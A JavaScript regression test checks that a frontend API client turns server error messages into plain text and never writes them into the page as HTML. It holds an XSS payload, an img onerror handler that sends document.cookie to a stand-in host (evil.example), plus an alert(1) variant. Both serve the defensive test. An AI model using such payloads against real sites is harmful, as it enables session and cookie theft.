// The API client's error messages (frontend/src/api/client.js), without a browser.
//
//     node scripts/test_client.mjs
//
// Run by scripts/preflight.py. A failed call's message comes from the server, and can
// carry a business's ERPNext's own words (connectors/remote.py copies its "exception"
// text in). It was once read by writing it into a detached <div> -- and an
// <img src=x onerror=...> fires even there (17 Nov 2026). Here the page's document is a
// stand-in whose every HTML sink throws, and DOMParser a stand-in that records what it
// parsed: the message must come back as plain text, through DOMParser, never written
// into the page.
let failed = 0;
const check = (ok, what) => {
  if (!ok) {
    failed += 1;
    console.log("FAIL:", what);
  }
};

const sinks = [];
const trap = () => {
  const el = {};
  for (const k of ["innerHTML", "outerHTML"]) {
    Object.defineProperty(el, k, {
      set(v) {
        sinks.push(v);
        throw new Error(`${k} written with server text`);
      },
      get: () => "",
    });
  }
  el.insertAdjacentHTML = (_, v) => {
    sinks.push(v);
    throw new Error("insertAdjacentHTML written with server text");
  };
  return el;
};
globalThis.document = { cookie: "csrftoken=t0k", createElement: trap, body: trap() };
const parsed = [];
globalThis.DOMParser = class {
  parseFromString(text, type) {
    parsed.push([text, type]);
    // What an inert text/html document's body says: its text, tags gone.
    return { body: { textContent: text.replace(/<[^>]*>/g, "") } };
  }
};

const { call, ApiError, stripTags } = await import("../frontend/src/api/client.js");

const hostile = '<img src=x onerror="fetch(\'//evil.example/\'+document.cookie)">Stock is short';
globalThis.fetch = async () => ({
  ok: false,
  status: 417,
  json: async () => ({
    exc_type: "ValidationError",
    _server_messages: JSON.stringify([JSON.stringify({ message: hostile })]),
  }),
});
let err = null;
try {
  await call("command_center.api.actions.create_task", { subject: "x" });
} catch (e) {
  err = e;
}
check(err instanceof ApiError, "a refused call throws an ApiError");
check(err && err.message === "Stock is short", `the message is plain text: ${err && err.message}`);
check(sinks.length === 0, `server text was written into the page: ${sinks}`);
check(parsed.length === 1 && parsed[0][1] === "text/html" && parsed[0][0] === hostile,
  "the message is read through DOMParser (an inert document)");

// A plain message (body.message) goes the same way.
globalThis.fetch = async () => ({ ok: false, status: 417, json: async () => ({ message: "<b>No</b> access" }) });
err = null;
try {
  await call("x.y");
} catch (e) {
  err = e;
}
check(err && err.message === "No access", `a plain message is plain text: ${err && err.message}`);
check(sinks.length === 0, "nothing written into the page");

// Without DOMParser (an old engine, a worker) the tags are dropped as text, never parsed.
delete globalThis.DOMParser;
check(stripTags('<img src=x onerror="alert(1)">Late  <i>by</i> 3 days') === "Late by 3 days",
  `the fallback drops tags as text: ${stripTags('<img src=x onerror="alert(1)">Late  <i>by</i> 3 days')}`);
check(sinks.length === 0, "the fallback writes nothing into the page");

if (failed) {
  console.log(`client: ${failed} failed`);
  process.exit(1);
}
console.log("client: all passed");
